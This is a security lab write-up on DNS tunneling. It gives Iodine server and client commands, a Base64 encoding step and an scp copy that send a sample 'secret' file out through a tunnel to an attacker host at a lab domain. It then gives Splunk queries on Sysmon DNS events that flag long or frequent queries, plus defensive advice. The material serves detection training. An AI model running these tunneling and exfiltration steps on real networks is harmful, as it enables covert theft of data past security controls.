
# 📄 **DNS Tunneling - Data Exfiltration via Encoded DNS Subdomain Queries**

---

## 📝 **Attack Title**

DNS Tunneling — Data exfiltration via encoded DNS subdomain queries

---

## 🔎 **Attack Summary**

In this simulation, I demonstrated a covert data exfiltration attack using DNS tunneling. DNS tunneling allows attackers to bypass traditional network security controls by encoding and transferring data through DNS requests. The objective of this simulation was to observe log artifacts generated during DNS tunneling and validate detection logic using Splunk.

---

## 🧰 **Lab Environment**

| Component        | Details                                                  |
| ---------------- | -------------------------------------------------------- |
| Attacker Machine | Kali Linux                                               |
| Victim Machine   | Windows 11 (or Linux for simplicity during client setup) |
| DNS Tunnel Tool  | Iodine                                                   |
| SIEM Platform    | Splunk Enterprise                                        |
| Log Sources      | Sysmon DNS logging, Windows Event Logs                   |

---

## 🚩 **Attack Details**

* **Attack Type**: Data Exfiltration via DNS Tunneling
* **Tools Used**: Iodine
* **Protocol Used**: DNS (port 53 UDP)
* **Payload**: Base64-encoded sensitive data

---

## 💻 **Attack Execution**

---

### 🔐 Step 1 — Prepare DNS Server for Tunneling

> *(Optional if testing locally with internal DNS server)*

* Registered domain: `labdomain.com`
* NS record created: `tunnel.labdomain.com` pointed to attacker's public IP

---

### 🔐 Step 2 — Install DNS Tunnel Tool (Iodine)

#### On Attacker (Kali Linux)

```bash
sudo apt update
sudo apt install iodine
```

#### Start iodine server:

```bash
sudo iodined -f -P secretpassword 10.0.0.1 tunnel.labdomain.com
```

---

### 🔐 Step 3 — Prepare Data for Exfiltration

#### On Victim (Windows/Linux)

Create sample secret data:

```powershell
echo "This is secret data" > C:\Users\victim\Documents\secret.txt
```

Encode data in Base64:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\victim\Documents\secret.txt")) > C:\Users\victim\Documents\secret_base64.txt
```

---

### 🔐 Step 4 — Start DNS Tunnel Client

#### On Victim (Linux for simplicity):

```bash
sudo apt install iodine
sudo iodine -f -P secretpassword tunnel.labdomain.com
```

#### Tunnel is established ✅

---

### 🔐 Step 5 — Exfiltrate Data

Copy the encoded file over the DNS tunnel:

```bash
scp secret_base64.txt 10.0.0.1:/tmp/
```

Decode on the attacker:

```bash
cat /tmp/secret_base64.txt | base64 -d
```

✅ Successful exfiltration via DNS tunnel.

---

## 📊 **Log Evidence Captured**

### 1️⃣ Sysmon DNS Logs (EventCode 22)

* Long DNS queries observed with unusually large subdomain strings.
* Frequent DNS requests to `tunnel.labdomain.com`

### 2️⃣ DNS Server Logs (if present)

* Multiple lookup requests for suspicious subdomains.

---

## 🔍 **Splunk Search Queries**

### 🔎 DNS Query Length Anomaly (detect long encoded queries)

```spl
index=win_logs sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=22
| eval query_length = len(QueryName)
| where query_length > 50
| stats count by QueryName, query_length, Computer
```

---

### 🔎 Focused Search on Your Tunneling Domain

```spl
index=win_logs sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=22 QueryName="*tunnel.labdomain.com*"
```

---

### 🔎 High Volume Queries from Same Host

```spl
index=win_logs sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=22
| stats count by Computer, QueryName
| where count > 100
```

---

## 📈 **Detection Outcome**

* ✅ Sysmon successfully logged DNS queries with long subdomains.
* ✅ Splunk successfully displayed DNS tunneling indicators.
* ✅ High-frequency and long DNS queries indicate exfiltration behavior.

---

## 🛡 **Defensive Recommendations**

* Enable Sysmon DNS Query Logging (Event ID 22).
* Monitor for long DNS query strings.
* Monitor abnormal DNS request frequencies.
* Limit external DNS resolution on critical servers.
* Use network security appliances capable of DNS inspection.
* Implement egress filtering to limit unauthorized DNS traffic.

---

## 📦 **MITRE ATT\&CK Mapping**

| Tactic            | Technique                                      |
| ----------------- | ---------------------------------------------- |
| Exfiltration      | T1048 — Exfiltration Over Alternative Protocol |
| Command & Control | T1071.004 — Application Layer Protocol: DNS    |
| Defense Evasion   | T1568 — Dynamic Resolution                     |

---

## ⚠️ LEGAL NOTICE

This activity was performed strictly for lab and educational purposes in a controlled environment.
